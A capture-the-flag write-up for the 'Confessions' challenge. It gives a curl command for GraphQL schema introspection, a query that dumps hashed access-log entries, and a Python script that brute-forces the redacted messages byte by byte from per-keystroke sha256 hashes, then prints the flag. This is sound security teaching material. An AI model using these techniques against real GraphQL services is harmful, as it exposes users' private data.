# Confessions
Confessions are sent and saved via graphql. Using payloadsallthethings, I dumped the schema
```
curl https://confessions.flu.xxx/graphql -XPOST -H 'content-type: application/json' -d '{"operationName":null,"query":"{__schema{queryType{name},mutationType{name},types{kind,name,description,fields(includeDeprecated:true){name,description,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},isDeprecated,deprecationReason},inputFields{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},interfaces{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},enumValues(includeDeprecated:true){name,description,isDeprecated,deprecationReason,},possibleTypes{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}}},directives{name,description,locations,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue}}}}","variables":{"id":"32ecd6ff-5324-46e2-8f6d-a28202269c60"}}'
```

I spotted an accessLog query, which allowed us to log access to the graphql endpoint, including adding new notes. However the messages were redacted, and we can only see the sha256 hashes of the messages. HOWEVER. A new confession is added on every keypress, meaning we can perform a byte-by-byte bruteforce:

```
curl https://confessions.flu.xxx/graphql -XPOST -H 'content-type: application/json' -d '{"operationName":null,"query":"{accessLog {name, args}}","variables":{"id":"32ecd6ff-5324-46e2-8f6d-a28202269c60"}}' | jq -r '.data.accessLog[] | .args' | grep hash | jq -r '.hash'
```
```py
hashes = output.split('\n')
import string
import hashlib
found = ''
while True:
    for c in string.printable:
        if hashlib.sha256(found.encode() + c.encode()).hexdigest() == hashes[len(found)]:
            found += c
            print(found)
            break
```
#### Flag:flag{but_pls_d0nt_t3ll_any1}
